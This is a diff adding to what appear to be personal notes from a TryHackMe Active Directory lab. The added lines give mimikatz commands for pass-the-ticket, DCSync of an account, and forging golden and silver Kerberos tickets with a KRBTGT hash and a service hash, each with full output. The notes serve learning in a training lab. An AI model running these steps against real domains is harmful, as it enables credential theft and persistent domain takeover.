@@ -234,7 +234,52 @@
       mimikatz # privilege::debug
       mimikatz # sekurlsa::tickets /export  //get all tickets on the host
       mimikatz # kerberos::ptt (after ppt is the path of ticekt saved)[0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi  //injecting ticket
-    
+    #### DC Sync of a single account
+      lsadump::dcsync /domain:za.tryhackme.loc /user:xxx
+      Golden ticket
+      // forge a golden ticket, we need the KRBTGT account's password hash
+        mimikatz # kerberos::golden /admin:forge /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-269
+        3558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt
+        User      : forge
+        Domain    : za.tryhackme.loc (ZA)
+        SID       : S-1-5-21-3885271727-2693558621-2658995185
+        User Id   : 500
+        Groups Id : *513 512 520 518 519
+        ServiceKey: 16f9af38fca3ada405386b3b57366082 - rc4_hmac_nt
+        Lifetime  : 7/22/2025 8:53:52 AM ; 7/22/2025 6:53:52 PM ; 7/29/2025 8:53:52 AM
+        -> Ticket : ** Pass The Ticket **
+        
+         * PAC generated
+         * PAC signed
+         * EncTicketPart generated
+         * EncTicketPart encrypted
+         * KrbCred generated
+        
+        Golden ticket for 'forge @ za.tryhackme.loc' successfully submitted for current session
+        
+      Silver ticket
+        mimikatz # kerberos::golden /admin:forge /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-269
+        3558621-2658995185 /target:THMSERVER1.za.tryhackme.loc /rc4:39f46ddb810ea482850bb93f4c1e4cc5 /service:
+        cifs /ptt
+        User      : forge 
+        Domain    : za.tryhackme.loc (ZA)
+        SID       : S-1-5-21-3885271727-2693558621-2658995185 
+        User Id   : 500
+        Groups Id : *513 512 520 518 519
+        ServiceKey: 39f46ddb810ea482850bb93f4c1e4cc5 - rc4_hmac_nt       
+        Service   : cifs
+        Target    : THMSERVER1.za.tryhackme.loc
+        Lifetime  : 7/22/2025 9:05:02 AM ; 7/20/2035 9:05:02 AM ; 7/20/2035 9:05:02 AM
+        -> Ticket : ** Pass The Ticket **
+        
+         * PAC generated
+         * PAC signed
+         * EncTicketPart generated
+         * EncTicketPart encrypted 
+         * KrbCred generated
+        
+        Golden ticket for 'forge @ za.tryhackme.loc' successfully submitted for current session
+
   
 
   
